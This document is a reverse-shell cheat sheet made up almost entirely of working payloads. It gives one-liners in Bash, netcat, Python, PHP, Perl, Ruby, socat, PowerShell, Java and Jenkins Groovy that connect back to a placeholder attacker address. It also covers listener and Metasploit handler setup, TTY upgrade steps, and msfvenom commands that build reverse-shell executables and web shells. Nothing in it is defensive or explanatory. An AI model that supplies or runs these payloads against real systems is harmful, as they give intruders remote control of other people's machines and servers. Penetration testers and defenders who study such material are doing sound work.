# Reverse Shells Cheat Sheet

## Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```

## Netcat
```bash
# Traditional
nc -e /bin/sh ATTACKER_IP PORT
nc -e /bin/bash ATTACKER_IP PORT

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Netcat OpenBSD
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

## Python
```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

## PHP
```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## Perl
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Socat
```bash
# Attacker listener
socat file:`tty`,raw,echo=0 tcp-listen:PORT

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
```

## PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded
powershell -e JABjAGwAaQBlAG4AdAAgAD0...
```

## Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Groovy (Jenkins)
```groovy
String host="ATTACKER_IP";
int port=PORT;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Listener
```bash
# Netcat
nc -lvnp PORT

# Socat
socat file:`tty`,raw,echo=0 tcp-listen:PORT

# Metasploit
use exploit/multi/handler
set payload [appropriate payload]
set LHOST 0.0.0.0
set LPORT PORT
run
```

## Shell Upgrade (TTY)

### Python
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Script
```bash
script /dev/null -c bash
```

### Full TTY
```bash
# In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z

# On attacker machine
stty raw -echo; fg

# Back in reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116
```

## msfvenom Payloads

### Windows
```bash
# Reverse shell exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o meterpreter.exe
```

### Linux
```bash
# Reverse shell elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf

# Meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o meterpreter.elf
```

### Web
```bash
# PHP
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.jsp

# WAR
msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f asp -o shell.asp
```
